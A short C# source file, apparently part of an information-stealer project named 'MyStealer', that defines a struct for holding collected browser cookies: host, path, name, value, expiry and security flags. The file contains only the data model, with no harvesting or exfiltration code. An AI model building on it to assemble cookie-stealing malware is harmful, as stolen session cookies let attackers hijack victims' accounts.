using System;
using System.Security.Policy;

namespace MyStealer.Collectors
{
    internal struct CookieEntry
    {
        public string ApplicationName { get; set; }
        public string ApplicationProfileName { get; set; }
        public DateTime CreationDateTime { get; set; }
        public DateTime LastAccessDateTime { get; set; }
        public DateTime ExpireDateTime { get; set; }
        public string Host { get; set; }
        public string Path { get; set; }
        public string Name { get; set; }
        public string Value { get; set; }
        public bool IsSecure { get; set; }
        public bool IsHttpOnly { get; set; }
        public int SameSite { get; set; }
        public int Priority { get; set; }

        public override string ToString() => $"Cookie({ApplicationName} - {ApplicationProfileName}){{{Host} : {Path} -> {Name} = {Value}}}";
    }
}
